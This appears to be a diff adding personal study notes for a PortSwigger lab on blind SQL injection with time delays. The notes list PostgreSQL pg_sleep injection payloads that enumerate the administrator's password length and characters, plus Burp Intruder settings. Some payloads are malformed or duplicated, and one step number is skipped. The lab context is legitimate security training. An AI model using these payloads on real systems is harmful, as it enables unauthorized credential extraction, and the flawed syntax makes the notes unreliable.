@@ -62,7 +62,112 @@ Lab: Blind SQL injection with time delays:
 
 
 
+Lab: Blind SQL injection with time delays and information retrieval
 Lab Source 2: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
+
+Target: To solve the lab, log in as the administrator user. 
+        Password of administrator than Login
+
+Step-1
+    ' || pg_sleep(10)--
+    Result:
+
+Step-2
+    if users table is does { 
+         sleep 10 second 
+    } 
+    else if users table is doesn't { 
+         dont sleep
+    }
+    True??
+    ' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--
+
+    False??
+    ' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--
+
+
+    ' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+Step-3 
+    Enumerate the Password length
+    True?
+    ' || (select case when (username='administrator' and LENGTH(password)>1) then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+    True?
+    ' || (select case when (username='administrator' and LENGTH(password)>25) then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+    Result:
+
+Step-4
+    Send Result length password to Intruder
+
+
+Step-5
+    Resource Pool > Create new resource pool > Maximum concurrent requests = 1
+
+Step-6
+    Start attack
+    This is can a get some time
+
+    Result: length is ? Characters.
+
+
+Step-7
+    Enumerate the administrator password
+    ' || (select case when (username='administrator' and substring(password,1,1='a')) then pg_sleep(5) else pg_sleep(-1) end from users)--
+
+Step-8
+    Send step before to Intruder
+
+Step-9
+    Check Resource Pool is mark "Custom resource pool 1"
+    Result: is it good query to get password ?
+
+Step-10
+    Send to Intruder
+
+Step-11    
+    1- Attack type = Cluster bomb
+    
+    2- Select to Payloads
+
+    3- Check Payloads for two cases
+
+    4- Check Resource pool is "Custom resource pool 1"
+
+Step-12
+    Start attack
+
+Step-14
+    when finished
+    1- Columns > Response received 
+    2- order by Response time
+
+Step-15
+    Write password characters in some place
+
+Step-16
+    Login with that
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
